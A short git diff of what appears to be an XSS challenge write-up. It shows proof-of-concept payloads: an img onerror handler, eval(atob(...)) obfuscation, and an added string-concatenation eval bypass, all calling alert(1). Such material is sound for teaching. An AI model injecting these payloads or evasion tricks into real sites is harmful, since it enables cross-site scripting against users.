@@ -44,7 +44,7 @@ Solution:
 <img src="" onerror=alert(1)>
 ```
 
-Thanks pal.
+Thanks M9k!
 
 ## 3
 Just call the function from console.
@@ -78,5 +78,7 @@ eval(atob('YWxlcnQoMSk7'));
 </script>
 ```
 
-Where `YWxlcnQoMSk7` is `alert(1);`.
+Where `YWxlcnQoMSk7` is `alert(1);`.  
+  
+Or you can use `eval("al"+"ert(1)")`, thanks pal!
 
